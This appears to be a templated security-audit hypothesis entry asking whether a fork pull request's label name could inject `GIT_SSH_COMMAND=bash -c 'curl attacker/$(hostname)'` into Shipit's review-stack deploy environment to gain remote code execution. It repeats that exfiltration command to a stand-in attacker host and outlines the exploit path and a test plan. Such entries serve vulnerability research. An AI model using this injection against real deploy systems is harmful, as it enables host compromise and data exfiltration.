# Q0870: Concrete `GIT_SSH_COMMAND=bash -c 'curl attacker/$(hostn` payload via a pull request label name (uppercased)

## Question
Can an unprivileged fork PR set `GIT_SSH_COMMAND` to `bash -c 'curl attacker/$(hostname)'` through a pull request label name (uppercased), so the review-stack deploy process executes it because it replaces the ssh program git invokes with an arbitrary command during fetch/clone?

## Target
- File/function: app/models/shipit/review_stack.rb + lib/shipit/command.rb
- Entrypoint: Unprivileged PR -> ReviewStack -> PerformTaskJob -> PTY.spawn
- Attacker controls: `GIT_SSH_COMMAND=bash -c 'curl attacker/$(hostname)'` via a pull request label name (uppercased)
- Exploit idea: `ReviewStack#env` merges `pull_request.labels.each_with_object({}) { |n,h| h[n.upcase]='true' }` with no key allowlist, and `LabelCapturingHandler#capture_labels` persists those names straight from the webhook body; the concrete value `bash -c 'curl attacker/$(hostname)'` replaces the ssh program git invokes with an arbitrary command during fetch/clone
- Invariant to test: No spawned deploy process ever sees a fork-controlled `GIT_SSH_COMMAND`.
- Expected Immunefi impact: Critical — Remote Code Execution on the Shipit deploy host (HackerOne/Immunefi RCE class)
- Fast validation: minitest: inject `GIT_SSH_COMMAND=bash -c 'curl attacker/$(hostname)'`, assert Command#unbundled_env carries it verbatim to PTY.spawn.
